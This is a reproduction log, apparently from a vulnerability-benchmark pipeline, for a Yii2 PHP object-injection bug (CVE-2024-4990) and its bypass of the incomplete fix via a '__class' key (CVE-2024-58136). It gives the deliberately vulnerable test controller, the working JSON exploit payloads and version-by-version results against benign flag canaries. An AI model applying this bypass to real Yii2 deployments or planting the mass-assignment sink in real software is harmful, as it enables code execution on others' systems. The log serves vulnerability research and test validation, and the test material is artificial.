deser_yii2_behavior_typecheck — REPRO LOG
CVE-2024-4990 (V1=2.0.50, TARGET, incomplete) -> CVE-2024-58136 (V2=2.0.52, fix). V0=2.0.49 pre-fix.
CWE-502 / CWE-470, PHP object injection. CISA KEV (exploited in the wild Feb–Apr 2025).

RUN MODE: real-app-http — REAL, unmodified Yii2 web app (yii\web\Application on the PHP built-in web
server) driven by an EXTERNAL HTTP `POST /trigger`. NO docker exec, NO in-process library call.
Rebuilt 2026-07-16 from the previous docker-exec/driver.php in-process trigger (BANNED).

ENV: php:8.1-cli; composer require yiisoft/yii2:<YII_VER> from Packagist (+ asset-packagist for
bower-asset hard-deps). Host ports: v0=18049, v1=18050, v2=18052 -> container :8080.

APP (unmodified Yii2, no framework edits):
  app/web/index.php        entry script -> (new yii\web\Application($config))->run()
  app/web/router.php       PHP built-in-server router -> pretty-URL routing for POST /trigger
  app/config/web.php       minimal web config (controllerNamespace app\controllers, JSON parser)
  app/controllers/TriggerController.php
        actionIndex: GET -> "PCB_READY yii=<ver>"; POST -> $c = new yii\base\Component();
        foreach ($body as $k=>$v) { $c->$k = $v; }   // mass-assignment -> Component::__set('as ..') sink
  app/PcbFlagProbe.php      benign non-Behavior canary; __construct reads /canary/flag.txt, echoes token
  app/PcbLegitBehavior.php  local yii\base\Behavior subclass (satisfies V1's `class` type check)

SINK (byte-identical across all 3 tags except the __set type check): an `as <name>` key routes
Component::__set into attachBehaviorInternal(... Yii::createObject($value)). Yii::createObject resolves
the class via `__class` FIRST (unset __class/class, instantiate __class) — this precedence is the pivot.

PAYLOADS (POST /trigger, JSON body):
  ORIGINAL (CVE-2024-4990 seed):  {"as pcb": {"class": "app\\PcbFlagProbe"}}
  RESIDUAL (CVE-2024-58136):      {"as pcb": {"class": "app\\PcbLegitBehavior", "__class": "app\\PcbFlagProbe"}}

GATE: python3 oracle.py --run-gate --with-v2   (flag = PCBFLAG_3bbffd0cf064caf033cbd56cf522ee07)

  original @ v0 (2.0.49): response contains PCB_LEAKED <flag>   -> reaches   (no type check)
  original @ v1 (2.0.50): InvalidConfigException "Class is not of type yii\base\Behavior or its
                          subclasses", no flag                 -> BLOCKED   (CVE-2024-4990 type check)
  residual @ v1 (2.0.50): response contains PCB_LEAKED <flag>   -> BYPASS    (type check passes on
                          class=PcbLegitBehavior; createObject instantiates __class=PcbFlagProbe; the
                          constructor's flag echo precedes the later attach-time "Unsupported
                          configuration type: object" error)
  residual @ v2 (2.0.52): InvalidConfigException "Class is not of type...", no flag -> BLOCKED
                          (CVE-2024-58136 __class-first check)
  original @ v2 (2.0.52): InvalidConfigException, no flag       -> BLOCKED

  validate_case:  original_poc_reaches_flag_on_v0 = true
                  original_poc_blocked_on_v1       = true
                  bypass_poc_reaches_flag_on_v1    = true
                  passed                           = true
  negatives:      _residual_blocked_on_v2 = true, _original_blocked_on_v2 = true

MANUAL HTTP CONFIRMATION (curl against v1, flag TESTFLAG_manual123):
  GET  /trigger                                            -> "PCB_READY yii=2.0.50"
  POST /trigger {"as pcb":{"class":"app\\PcbFlagProbe"}}   -> InvalidConfigException, no flag (blocked)
  POST /trigger {"as pcb":{"class":"app\\PcbLegitBehavior","__class":"app\\PcbFlagProbe"}}
                                                           -> PCB_LEAKED TESTFLAG_manual123 (bypass)

DATA-QUALITY: distinct fixed versions (2.0.50 vs 2.0.52); distinct fixes (add class-key type check vs
reorder to __class-first check); V1 genuinely has the guard AND is genuinely bypassed by the __class
residual it does not defend; V2 closes exactly that residual; original != residual on V1 (direct
blocked, __class-nested reaches). The __class pivot bypass is confirmed over the REAL external HTTP path.

